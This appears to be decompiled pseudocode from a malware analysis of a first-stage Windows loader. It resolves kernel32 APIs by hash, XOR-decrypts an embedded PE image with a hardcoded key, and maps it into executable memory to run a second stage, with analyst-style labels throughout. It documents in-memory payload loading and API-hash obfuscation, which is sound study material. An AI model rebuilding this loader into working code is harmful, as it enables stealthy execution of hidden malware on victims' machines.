
int stage1_main(undefined4 unused)
{
  // Key
  key[0] = 0x31;
  key[1] = 0x58;
  key[2] = 100;
  key[3] = 0x73;
  key[4] = 0x48;
  key[5] = 0x78;
  key[6] = 0x4e;
  key[7] = 0x43;
  key[8] = 0x59;
  key[9] = 0x36;
  key[10] = 0x55;
  key[11] = 0x29;
  key[12] = 0x59;
  key[13] = 0x79;
  key[14] = 0x65;
  key[15] = 0x41;
  key[16] = 0x5f;
  key[17] = 0x57;
  key[18] = 0x43;
  key[19] = 0;

  // dll name
  library_name[0] = L'k';
  library_name[1] = L'e';
  library_name[2] = L'r';
  library_name[3] = L'n';
  library_name[4] = L'e';
  library_name[5] = L'l';
  library_name[6] = L'3';
  library_name[7] = L'2';
  library_name[8] = L'.';
  library_name[9] = L'd';
  library_name[10] = L'l';
  library_name[0xb] = L'l';
  library_name[0xc] = L'\0';

  ptr1 = 0;
  sizeStage2 = 0;

  _VirutalAlloc = (code *)0x0;
  _LoadLibrary = 0;
  _aquireSRWLockExclusive = (code *)0x0;
  _GetProcAddress = 0;

  _ptr_Kernel32 = get_library_ptr(library_name);
  _aquireSRWLockExclusive = (code *)dynamic_API_import(_ptr_Kernel32,0xd57b2);

  lock_name_ptr[0] = L's';
  lock_name_ptr[1] = L'c';
  lock_name_ptr[2] = L'.';
  lock_name_ptr[3] = L'e';
  lock_name_ptr[4] = L'x';
  lock_name_ptr[5] = L'e';
  lock_name_ptr[6] = L'\0';
  var1 = (*_aquireSRWLockExclusive)(&lock_name_ptr);

  if (var1 != 0) {
    _VirutalAlloc = (code *)dynamic_API_import(_ptr_Kernel32,0xe3142);
    _LoadLibrary = dynamic_API_import(_ptr_Kernel32,0xd5786);
    _GetProcAddress = dynamic_API_import(_ptr_Kernel32,0x348bfa);

    sizeOfHeaders = 0x31000;
    DOSHeader_ptr = (*_VirutalAlloc)(0,sizeOfHeaders,0x3000,4);
    for (i = 0; i < sizeOfHeaders; i = i + 1) {
      *(byte *)(DOSHeader_ptr + i) = (&EncryptedHeader_data)[i] ^ key[i % 0x14];
    }

    sizeOfImage = sizeOfImage(DOSHeader_ptr);
    ptr_stage2 = (*_VirutalAlloc)(0,sizeOfImage,0x3000,0x40);
    if (ptr_stage2 != 0) {

      PEheader_ptr = DOSHeader_ptr + *(int *)(DOSHeader_ptr + 0x3c);
      // PEheader_ptr + 0x14 = SizeOfOptionHeader
      // PEheader_ptr + 0x18 = start of OptionalHeader
      sectionTable = PEheader_ptr + 0x18 + (uint)*(ushort *)(PEheader_ptr + 0x14);
      *(int *)(PEheader_ptr + 0x34) = ptr_stage2; // ImageBase
      move_mem(ptr_stage2, DOSHeader_ptr,*(uint *)(PEheader_ptr + 0x54));

      baseRelocTable = *(uint *)(PEheader_ptr + 0xa0);
      sizeRelocTable = *(undefined4 *)(PEheader_ptr + 0xa4);
      section_table_hasReloc = 0;
      section_table_hasImport = 0;
      if (*(short *)(PEheader_ptr + 6) != 0) {

        if ((*(uint *)(sectionTable + 0xc) <= baseRelocTable) &&
           (baseRelocTable < (uint)(*(int *)(sectionTable + 0xc) + *(int *)(sectionTable + 8)))) {
          section_table_hasReloc = sectionTable;
        }
        if ((*(uint *)(sectionTable + 0xc) <= *(uint *)(PEheader_ptr + 0x80)) &&
           (*(uint *)(PEheader_ptr + 0x80) < (uint)(*(int *)(sectionTable + 0xc) + *(int *)(sectionTable + 8)))) {
          section_table_hasImport = sectionTable;
        }

        move_mem( ptr_stage2 + *(int *)(sectionTable + 0xc),
                  DOSHeader_ptr + *(int *)(sectionTable + 0x14),
                  *(uint *)(sectionTable + 0x10));

        sectionTable = repair_execute_stage2();
        return sectionTable;
      }
    }
  }
  return 0;
}

undefined4 __cdecl sizeOfImage(int DOSHeader_ptr)
{
  return *(undefined4 *)(DOSHeader_ptr + *(int *)(DOSHeader_ptr + 0x3c) + 0x50);
}

void __cdecl move_mem(int ptr_dest,int ptr_source,uint sizeOfSource)
{
  for (i = 0; i < sizeOfSource; i = i + 1) {
    *(undefined *)(ptr_dest + i) = *(undefined *)(ptr_source + i);
  }
  return;
}

